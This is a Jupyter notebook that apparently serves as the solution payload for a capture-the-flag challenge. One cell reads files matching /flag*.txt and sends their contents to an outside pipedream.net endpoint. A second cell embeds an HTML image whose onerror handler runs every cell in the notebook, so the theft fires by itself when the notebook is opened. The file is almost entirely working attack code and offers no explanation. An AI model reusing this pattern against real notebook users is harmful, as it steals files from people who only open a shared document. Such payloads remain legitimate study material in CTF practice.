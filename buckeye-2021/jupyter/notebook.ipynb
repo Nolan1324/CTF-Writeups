{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f14b859b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<http.client.HTTPResponse at 0x1952f5d1580>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import urllib\n",
    "import glob\n",
    "\n",
    "endpoint = 'https://enbnoedu5p8tj.x.pipedream.net/'\n",
    "\n",
    "path = \"/flag*.txt\"\n",
    "flag = ''\n",
    "\n",
    "for filename in glob.glob(path):\n",
    "    with open(filename, 'r') as f:\n",
    "        flag = f.readline()\n",
    "\n",
    "urllib.request.urlopen(endpoint + flag)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "351b1259",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src='http://example.com' onerror='if(!window.loaded) IPython.notebook.execute_all_cells(); window.loaded = true' />\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "<img src='http://example.com' onerror='if(!window.loaded) IPython.notebook.execute_all_cells(); window.loaded = true' />"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
